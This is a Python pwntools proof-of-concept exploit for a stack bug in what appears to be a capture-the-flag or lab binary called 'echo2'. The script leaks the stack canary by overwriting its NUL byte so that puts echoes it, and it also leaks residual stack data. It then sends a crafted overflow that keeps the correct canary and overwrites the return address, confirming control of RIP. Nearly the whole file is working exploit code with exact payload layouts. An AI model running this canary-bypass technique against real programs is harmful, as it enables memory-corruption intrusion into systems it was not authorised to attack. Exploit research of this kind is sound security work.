#!/usr/bin/env python3
"""
======================================================================
BUG-002: STACK_INFORMATION_LEAK — puts(buf) echoes non-NUL-terminated
buffer, leaking stack canary and adjacent stack data.

Primitive Verification PoC for BUG-002.

Primitives verified:
  PRIM-001: INFO_LEAK (canary via NUL byte overwrite + puts echo)
  PRIM-002: INFO_LEAK (residual stack data via short input on 2nd iter)
  PRIM-003: RIP_CONTROL (canary leak → bypass → return address overwrite)
======================================================================
"""
from pwn import *
import sys

context.log_level = 'error'
context.arch = 'amd64'

BINARY = '/work/workspace/0022-2022-45-echo2-20260908-230209/target'

# ─── Helper ──────────────────────────────────────────────────────────
def leak_canary(p):
    """
    PRIM-001: Leak stack canary via puts() on non-NUL-terminated buffer.

    Method:
      1. Send 0x68=104 bytes of 'A' + 1 byte 'X' (total 105 bytes, no NUL).
         The 'X' overwrites canary[0] (the NUL low byte at [rbp-0x8]).
      2. puts(buf) reads: 104 'A' + 'X'(canary[0]) + canary[1..7] + ...
         until it hits a NUL byte in adjacent stack memory.
      3. Extract canary[1..7] from the echo, reconstruct full canary
         as 0x00 || canary[1..7].
    """
    p.recvuntil(b'Input:', timeout=5)

    # Send 104 'A' + 'X' to overwrite canary's NUL low byte
    fill = b'A' * 0x68 + b'X'
    p.send(fill)

    # Receive echo: puts outputs buf content until NUL, then '\n'
    # Then puts("Input:") for next prompt
    data = p.recvuntil(b'Input:', timeout=5)

    # Parse echo line (between first \n and \nInput:)
    # data = b'\n<echo_content>\nInput:'
    echo_line = data.split(b'\nInput:')[0]
    # echo_line = b'\n' + 104*'A' + 'X' + canary[1..7] + possibly_more

    # Offset 0: \n (from puts)
    # Offset 1..104: 'A' * 104
    # Offset 105 (0x69): 'X' (overwritten canary[0])
    # Offset 106..112 (0x6a..0x70): canary[1..7]
    canary_bytes_1_7 = echo_line[106:113]  # 7 bytes

    if len(canary_bytes_1_7) < 7:
        print(f"  WARNING: only got {len(canary_bytes_1_7)} canary bytes")
        return None

    # Reconstruct: canary[0] is always 0x00 on x86-64 Linux
    canary_full = b'\x00' + canary_bytes_1_7
    canary_val = u64(canary_full)

    # Also show any additional leaked bytes (saved RBP, return addr, etc.)
    extra = echo_line[113:]
    print(f"  Leaked canary[1..7]: {canary_bytes_1_7.hex()}")
    print(f"  Reconstructed canary: {hex(canary_val)}")
    if extra:
        print(f"  Additional leaked bytes (saved RBP etc.): {extra.hex()}")

    return canary_val


def overflow_with_canary(p, canary_val, target_rip):
    """
    PRIM-003: Overflow buffer with correct canary, overwrite return address.

    Payload layout (0x80=128 bytes):
      [0x00..0x67]  104 bytes padding ('D')
      [0x68..0x6f]  8 bytes canary (correct value)
      [0x70..0x77]  8 bytes saved RBP (arbitrary)
      [0x78..0x7f]  8 bytes return address (attacker-controlled)
    """
    payload = b'D' * 0x68          # padding
    payload += p64(canary_val)     # canary (correct)
    payload += p64(0x4545454545454545)  # saved RBP
    payload += p64(target_rip)     # return address

    p.send(payload)
    p.recvuntil(b'Input:', timeout=5)

    # Exit loop: send "--\x00" to make strcmp(buf, "--") == 0
    # The \x00 ensures buf is "--\0..." which matches "--"
    p.send(b'--\x00')

    # Collect remaining output
    try:
        remaining = p.recvall(timeout=5)
    except:
        remaining = b''

    p.wait()
    return p.returncode, remaining


# ─── PRIM-001: INFO_LEAK (canary via NUL byte overwrite) ────────────
def prim_001():
    print("=== PRIM-001: INFO_LEAK (canary via NUL byte overwrite + puts echo) ===")
    p = process(BINARY)
    canary = leak_canary(p)

    if canary is not None:
        # Verify canary low byte is 0x00
        low_byte = canary & 0xff
        print(f"  Canary low byte: {hex(low_byte)} (expected 0x00)")
        if low_byte == 0x00:
            print("  === PRIM-001: VERIFIED — canary leaked, low byte is 0x00 ===")
        else:
            print("  === PRIM-001: PARTIAL — canary leaked but low byte unexpected ===")
    else:
        print("  === PRIM-001: FAILED — could not leak canary ===")

    p.close()
    return canary


# ─── PRIM-002: INFO_LEAK (residual stack data via short input) ──────
def prim_002():
    print("\n=== PRIM-002: INFO_LEAK (residual stack data via short input) ===")
    p = process(BINARY)
    p.recvuntil(b'Input:', timeout=5)

    # Iteration 1: fill entire buffer (104 bytes before canary) with 'B'
    # This ensures buf[0..103] = 'B', no NUL in buffer proper
    p.send(b'B' * 0x68)
    p.recvuntil(b'Input:', timeout=5)

    # Iteration 2: send only 4 bytes of 'C'
    # read() writes 4 bytes at buf[0..3], buf[4..103] still has 'B' from before,
    # buf[104..111] = canary (low byte 0x00 stops puts)
    # puts reads: CCCC + BBB...B (100 B's) + canary[0](0x00) → stops
    # But canary[0] is 0x00, so puts stops at offset 104.
    # To leak past our data, we need to overwrite canary[0] too.
    # Send 105 bytes: 4 'C' + 100 'B' + 'X' (overwrite canary[0])
    p.send(b'C' * 4 + b'B' * 100 + b'X')
    data = p.recvuntil(b'Input:', timeout=5)

    echo_line = data.split(b'\nInput:')[0]
    # echo_line = \n + CCCC + BBB...B + X + canary[1..7] + saved_RBP + ...
    # Known prefix: \n + 4C + 100B + X = 106 bytes
    known_prefix = b'\n' + b'C' * 4 + b'B' * 100 + b'X'
    leaked = echo_line[len(known_prefix):]

    print(f"  Echo length: {len(echo_line)} bytes")
    print(f"  Leaked residual bytes: {len(leaked)}")
    if leaked:
        print(f"  Leaked hex: {leaked.hex()}")

    if len(leaked) > 0:
        print(f"  === PRIM-002: VERIFIED — puts() leaked {len(leaked)} bytes of residual stack data ===")
    else:
        print("  === PRIM-002: FAILED — no residual data leaked ===")

    p.close()
    return len(leaked) > 0


# ─── PRIM-003: RIP_CONTROL (canary bypass + return address overwrite) ─
def prim_003():
    print("\n=== PRIM-003: RIP_CONTROL (canary leak → bypass → return addr overwrite) ===")

    targets = [
        0x4141414141414141,
        0xdeadbeefcafebabe,
        0x4242424242424242,
    ]

    all_verified = True
    for target in targets:
        p = process(BINARY)
        canary = leak_canary(p)

        if canary is None:
            print(f"  Target {hex(target)}: FAILED to leak canary")
            all_verified = False
            p.close()
            continue

        rc, remaining = overflow_with_canary(p, canary, target)

        if rc == -11:  # SIGSEGV
            print(f"  Target {hex(target)}: exit={rc} (SIGSEGV) — canary bypassed, RIP jumped to target")
        elif rc == -6:  # SIGABRT
            print(f"  Target {hex(target)}: exit={rc} (SIGABRT) — canary check FAILED")
            all_verified = False
        else:
            print(f"  Target {hex(target)}: exit={rc} — unexpected")
            all_verified = False

        p.close()

    if all_verified:
        print("  === PRIM-003: VERIFIED — 3 different target RIPs all caused SIGSEGV (canary bypassed) ===")
    else:
        print("  === PRIM-003: FAILED ===")

    return all_verified


# ─── Main ───────────────────────────────────────────────────────────
if __name__ == '__main__':
    print("======================================================================")
    print("BUG-002: INFO_LEAK via puts(buf) on non-NUL-terminated buffer")
    print("======================================================================\n")

    r1 = prim_001()
    r2 = prim_002()
    r3 = prim_003()

    print("\n======================================================================")
    print("SUMMARY:")
    print(f"  PRIM-001 (canary leak via NUL overwrite): {'VERIFIED' if r1 else 'FAILED'}")
    print(f"  PRIM-002 (residual stack data leak):      {'VERIFIED' if r2 else 'FAILED'}")
    print(f"  PRIM-003 (RIP_CONTROL via canary bypass): {'VERIFIED' if r3 else 'FAILED'}")
    print("======================================================================")
